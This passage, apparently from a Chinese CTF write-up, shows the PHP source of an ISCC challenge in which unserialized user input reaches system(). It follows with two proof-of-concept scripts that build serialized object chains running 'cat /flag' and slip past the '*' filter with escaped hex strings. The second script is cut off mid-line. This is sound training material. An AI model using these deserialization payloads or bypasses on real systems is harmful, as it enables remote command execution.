class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$status</span> = <span class="string">&quot;new&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$is_unser_finished</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$iscc_file</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = (count(<span class="variable">$_FILES</span>) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$iscc_file</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$is_upload</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">                <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file(<span class="variable">$iscc_file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$check</span> = @getimagesize(<span class="variable">$iscc_file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$target_dir</span> = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    <span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$iscc_file</span>[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$iscc_file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">                        <span class="variable">$iscc_file</span> = <span class="variable">$target_file</span>;</span><br><span class="line">                        <span class="variable">$status</span> = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;echo &#x27;æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$error</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$error</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        <span class="variable">$pAssM0rd</span> = hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pAssM0rd&#x27;</span>] === <span class="variable">$pAssM0rd</span>)</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_unser_finished</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$is_unser_finished</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params"><span class="variable">$len</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    <span class="variable">$randstring</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randstring</span> .= <span class="variable">$characters</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$characters</span>))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randstring</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$s</span>, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">    @unlink(<span class="variable">$iscc_file</span>);</span><br><span class="line">    <span class="variable">$status</span> = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$whatareyounongshane</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$whatareyounongshane</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            <span class="variable">$resp</span> = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$resp</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$wtf</span> = waf(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? <span class="variable">$_GET</span>[<span class="string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$goodshit</span> = @unserialize(<span class="variable">$wtf</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_unser_finished</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$status</span>, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc å’Œ exp å…ˆè´´ç€ï¼Œå‘ä¸æ€¥ç€å¡«ï¼Œæœ‰ç©ºäº†ä¸€åˆ‡å¥½è¯´</p><p><code>poc1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e=<span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;d=<span class="keyword">new</span> ISCC_Command();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b=<span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c=<span class="keyword">new</span> ISCC_Command();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="keyword">new</span> ISCC_Upload();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ISCC_Login();</span><br><span class="line"><span class="variable">$b</span>=urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%20&quot;</span>,str_replace(<span class="string">&quot;\\2A&quot;</span>,<span class="string">&quot;%5C2A&quot;</span>,str_replace(<span class="string">&quot;\\00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,urldecode(str_replace(<span class="string">&quot;%2A&quot;</span>,<span class="string">&#x27;%5C2A&#x27;</span>,str_replace(<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,<span class="variable">$b</span>)))))));</span><br><span class="line"><span class="comment">//var_dump(unserialize(urldecode(&#x27;O:10:&quot;ISCC_Login&quot;:3:&#123;S:1:&quot;b&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;c&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;S:1:&quot;a&quot;;O:11:&quot;ISCC_Upload&quot;:2:&#123;S:1:&quot;e&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;d&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;&#x27;)));</span></span><br></pre></td></tr></table></figure><p><code>poc2</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_Upload(),</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_ResetCMD(),</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_Command(),</span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span>=urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%20&quot;</span>,str_replace(<span class="string">&quot;\\2A&quot;</span>,<span class="string">&quot;%5C2A&quot;</span>,str_replace(<span class="string">&quot;\\00&quot;</span>,<span 